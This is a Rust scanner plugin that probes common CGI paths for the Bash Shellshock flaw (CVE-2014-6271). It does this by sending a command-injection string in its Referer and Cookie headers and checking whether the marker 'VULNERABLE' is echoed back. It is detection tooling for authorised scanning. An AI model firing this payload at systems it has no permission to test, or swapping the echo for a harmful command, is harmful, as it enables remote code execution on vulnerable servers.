/*
 * http-shellshock (Rust) - Bash CGI Shellshock (CVE-2014-6271) probe.
 * Faithful port of http-shellshock.c.
 * Use only on networks you own or have permission to scan.
 */
#![allow(dead_code, non_snake_case, non_upper_case_globals)]

include!("alscript.rs");

fn run(ctx: &AlScriptContext) -> i32 {
    if !ar_valid(ctx) {
        return 1;
    }
    let paths = [
        "/cgi-bin/status",
        "/cgi-bin/test.cgi",
        "/cgi-bin/admin.cgi",
        "/cgi-sys/defaultwebpage.cgi",
        "/",
    ];
    let extra = "Referer: () { :; }; echo VULNERABLE\r\n\
                 Cookie: () { :; }; echo VULNERABLE\r\n";
    for p in paths.iter() {
        let resp = match ar_http_request(ctx, "GET", p, extra, None, None) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        let body = ar_http_body(&resp);
        if find_sub(body, b"VULNERABLE").is_some() || find_sub(&resp, b"VULNERABLE").is_some() {
            ar_out(ctx, &format!("VULNERABLE: Shellshock CVE-2014-6271 at {}", p));
            return 0;
        }
    }
    ar_out(ctx, "not vulnerable: Shellshock CVE-2014-6271 not confirmed");
    0
}

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    if ctx.is_null() {
        return 1;
    }
    let ctx: &AlScriptContext = unsafe { &*ctx };
    run(ctx)
}
